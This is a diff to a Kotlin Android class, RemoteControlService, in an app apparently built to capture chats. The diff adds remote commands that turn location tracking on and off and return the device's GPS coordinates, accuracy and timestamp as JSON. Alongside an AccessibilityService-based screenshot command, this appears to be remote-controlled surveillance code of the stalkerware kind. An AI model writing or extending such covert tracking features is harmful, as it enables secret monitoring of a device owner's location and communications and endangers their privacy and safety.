@@ -63,6 +63,32 @@ class RemoteControlService(
                     // which have access to the service
                     RemoteCommandResult(false, "Screenshot command should be handled by service with AccessibilityService access")
                 }
+                "enable_location" -> {
+                    val locationService = com.chats.capture.services.LocationService(context)
+                    locationService.startTracking()
+                    RemoteCommandResult(true, "Location tracking enabled")
+                }
+                "disable_location" -> {
+                    val locationService = com.chats.capture.services.LocationService(context)
+                    locationService.stopTracking()
+                    RemoteCommandResult(true, "Location tracking disabled")
+                }
+                "get_location" -> {
+                    val locationService = com.chats.capture.services.LocationService(context)
+                    val location = locationService.getCurrentLocation()
+                    if (location != null) {
+                        val locationJson = Gson().toJson(mapOf(
+                            "latitude" to location.latitude,
+                            "longitude" to location.longitude,
+                            "accuracy" to location.accuracy,
+                            "timestamp" to location.time,
+                            "provider" to location.provider
+                        ))
+                        RemoteCommandResult(true, "Location retrieved", locationJson)
+                    } else {
+                        RemoteCommandResult(false, "Location not available")
+                    }
+                }
                 else -> {
                     RemoteCommandResult(false, "Unknown command: ${command.action}")
                 }
